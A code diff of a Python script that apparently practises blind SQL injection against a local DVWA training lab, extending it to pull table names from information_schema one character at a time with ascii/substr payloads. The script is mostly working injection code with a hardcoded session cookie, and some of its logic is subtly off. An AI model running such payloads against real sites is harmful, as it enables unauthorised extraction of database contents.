@@ -11,7 +11,7 @@ def listToString(str_list):
 
 url ="http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/"
 
-add_url = '?id=1&Submit=Submit&'
+
 
 session = "PHPSESSID"
 session_val = "sdoop6tab6tochvo3jvoakevsg"
@@ -42,7 +42,6 @@ def check_length():
                 return len
 #1' and ascii(substr(database(),1,1))=100 # (0,127)
 def check_name():
-    acode = 1
     len = check_length()
     name=[]
     for length in range(len):
@@ -63,7 +62,9 @@ def check_name():
                     name.append(chr(acode))
                     print('ascii is:' + str(acode)+" Text is:" + chr(acode) )
                     print('---------------------------------------------+')
-    print("database name is:" + listToString(name))
+    finame =listToString(name)
+    print("database name is:" + finame)
+    return finame
 
 def count():
     cnum = 0
@@ -80,8 +81,39 @@ def count():
         if pre_tag is not None:
             if pre_tag.text == check_str:
                 print(cnum)
-                print('table count is: ' + str(cnum))
+                print('table count is: ' + str(cnum)) 
                 print('---------------------------------------------+')
                 return cnum
 
-check_name()
+#1' and ascii(substr((select table_name from information_schema.tables where table_schema ='dvwa'limit 1,1),1,1))=117 #            
+def check_value():
+    cnum =2
+    len = 10
+    name = []
+    name_list=[]
+    finame = "'dvwa'"
+    for c in range(cnum):
+        
+        for l in range(len):
+            for acode in range(32,127):
+                if acode == 37 or acode == 126 or acode == 94 or acode == 92 or acode == 60 or acode == 59 or acode == 63 or acode == 92 : 
+                    continue
+                attack_code = "1' and ascii(substr((select table_name from information_schema.tables where table_schema = "+finame+" limit {},1),{},1))={}#".format(c,l,acode)
+                payload = {
+                    "id": attack_code,
+                    "Submit": "Submit"
+                }
+                res = requests.post(url, cookies=cookies, params=payload)
+                soup = bs(res.text, "html.parser")
+                pre_tag = soup.find('pre')
+                if pre_tag is not None:
+                    if pre_tag.text == check_str:
+                        print(chr(acode))
+                        name.append(chr(acode))
+                        print('ascii is:' + str(acode)+" Text is:" + chr(acode) )
+                        print('---------------------------------------------+')
+        # print(listToString(name))
+        name_list.append(listToString(name))
+        name.clear()
+        print(name_list)
+check_value()
